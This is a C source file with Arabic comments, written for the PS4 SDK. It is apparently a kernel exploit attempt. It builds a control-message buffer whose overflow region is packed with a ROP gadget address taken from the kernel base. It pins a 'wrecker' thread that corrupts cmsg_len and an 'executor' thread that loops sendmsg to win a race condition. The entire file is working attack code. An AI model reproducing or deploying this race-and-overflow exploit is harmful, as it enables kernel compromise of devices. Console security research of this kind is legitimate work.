#include <ps4.h>

// --- تعريف الهياكل المفقودة التي لا تتعارض مع kernel.h ---
struct cmsghdr { uint32_t cmsg_len; int cmsg_level; int cmsg_type; };
struct msghdr {
    void *msg_name; uint32_t msg_namelen; struct iovec *msg_iov;
    int msg_iovlen; void *msg_control; uint32_t msg_controllen; int msg_flags;
};

// هيكل الـ CPU Set المتوافق مع PS4/FreeBSD
typedef struct { uint64_t bits[16]; } cpuset_t;
#define CPU_SET(n, p) ((p)->bits[(n)/64] |= (1ULL << ((n)%64)))
#define CPU_ZERO(p) memset((p), 0, sizeof(cpuset_t))

// --- المتغيرات العامة ---
#define PS4_PAGE_SIZE 0x4000
#define OVERFLOW_SIZE 256 
#define NCMSG         14
#define OFF_PUSH_RSP_POP_RSI_RET 0x9B3EE6 

uint8_t *BaseArea;
struct cmsghdr *ControlBuf;
size_t ControlBufLen;
volatile int stop_race = 0;
uint64_t n_tries = 0;

// --- 1. بناء البفر مع تقارير Debug ---
void BuildPrecisionBuffer(uint64_t kbase) {
    printf_debug("[BUILD] Starting buffer preparation...\n");
    
    size_t cmsgsize = NCMSG * sizeof(struct cmsghdr);
    size_t allocsz = (cmsgsize + OVERFLOW_SIZE + PS4_PAGE_SIZE - 1) & ~(PS4_PAGE_SIZE - 1);
    
    // حجز الذاكرة
    BaseArea = (uint8_t *)mmap(NULL, allocsz + PS4_PAGE_SIZE, PROT_READ | PROT_WRITE, 0x0002 | 0x1000, -1, 0);
    if (BaseArea == (uint8_t *)-1) {
        printf_debug("[ERROR] mmap failed (errno: %d)\n", errno);
        return;
    }
    printf_debug("[BUILD] Memory mapped at: %p\n", BaseArea);

    // حماية صفحة الـ EFAULT
    if (mprotect(BaseArea + allocsz, PS4_PAGE_SIZE, PROT_NONE) != 0) {
        printf_debug("[ERROR] mprotect failed!\n");
    }

    // محاذاة البفر
    uint8_t *aligned_base = BaseArea + (allocsz - (cmsgsize + OVERFLOW_SIZE));
    ControlBuf = (struct cmsghdr *)aligned_base;
    ControlBufLen = cmsgsize;

    for (int i = 0; i < NCMSG; i++) {
        ControlBuf[i].cmsg_len = sizeof(struct cmsghdr);
        ControlBuf[i].cmsg_type = 7;
    }

    uintptr_t trigger = kbase + OFF_PUSH_RSP_POP_RSI_RET;
    uint8_t *overflow_ptr = (uint8_t *)aligned_base + cmsgsize;
    for (int i = 0; i < OVERFLOW_SIZE; i += 8) {
        *(uintptr_t *)(overflow_ptr + i) = trigger;
    }
    printf_debug("[BUILD] Payload armed at: %p\n", overflow_ptr);
}

// --- 2. خيط التخريب (Wrecker) ---
void *wrecker_thread(void *arg) {
    (void)arg;
    printf_debug("[WRECKER] Thread alive on Core 1\n");
    while (!stop_race) {
        ControlBuf[NCMSG-1].cmsg_len = sizeof(struct cmsghdr);
        for(volatile int i=0; i<150; i++); 
        
        ControlBuf[NCMSG-1].cmsg_len = 0xFFFFFFFF;
        for(volatile int i=0; i<150; i++);
    }
    printf_debug("[WRECKER] Thread stopping...\n");
    return NULL;
}

// --- 3. خيط التنفيذ (Executor) ---
void *executor_thread(void *arg) {
    (void)arg;
    struct msghdr msg;
    memset(&msg, 0, sizeof(msg));
    msg.msg_control = ControlBuf;
    msg.msg_controllen = (uint32_t)ControlBufLen;
    const int bad_fd = 666;

    printf_debug("[EXEC] Thread alive on Core 2\n");
    while (!stop_race) {
        n_tries++;
        syscall(28, bad_fd, &msg, 0); 
        
        if (errno == 14) { // EFAULT
            stop_race = 1;
            printf_debug("[SUCCESS] EFAULT CAUGHT! Tries: %llu\n", n_tries);
            break;
        }
        
        if (n_tries % 100000 == 0) {
            printf_debug("[EXEC] Pulse check: %llu tries...\n", n_tries);
        }
    }
    return NULL;
}

int _main(struct thread *td) {
    (void)td;
    initKernel(); initLibc(); initSysUtil();
    
    printf_debug("\n--- [PS4 RACE DEBUG START] ---\n");

    uint64_t kbase = get_kernel_base();
    printf_debug("[INFO] Kernel Base: 0x%llx\n", kbase);

    BuildPrecisionBuffer(kbase);

    // إعداد الأنوية باستخدام التعريفات الموجودة في libPS4
    cpuset_t cpuset1, cpuset2;
    CPU_ZERO(&cpuset1); CPU_SET(1, &cpuset1);
    CPU_ZERO(&cpuset2); CPU_SET(2, &cpuset2);

    ScePthread wrid, exid;
    
    // إنشاء الخيوط وربطها بالأنوية
    scePthreadCreate(&wrid, NULL, wrecker_thread, NULL, "wrecker");
    pthread_setaffinity_np(wrid, sizeof(cpuset_t), &cpuset1);
    printf_debug("[INFO] Wrecker bound to Core 1\n");

    scePthreadCreate(&exid, NULL, executor_thread, NULL, "executor");
    pthread_setaffinity_np(exid, sizeof(cpuset_t), &cpuset2);
    printf_debug("[INFO] Executor bound to Core 2\n");

    // الانتظار حتى النجاح
    scePthreadJoin(exid, NULL);
    stop_race = 1;
    scePthreadJoin(wrid, NULL);

    printf_debug("[FINISH] Exploit loop exited.\n");
    return 0;
}
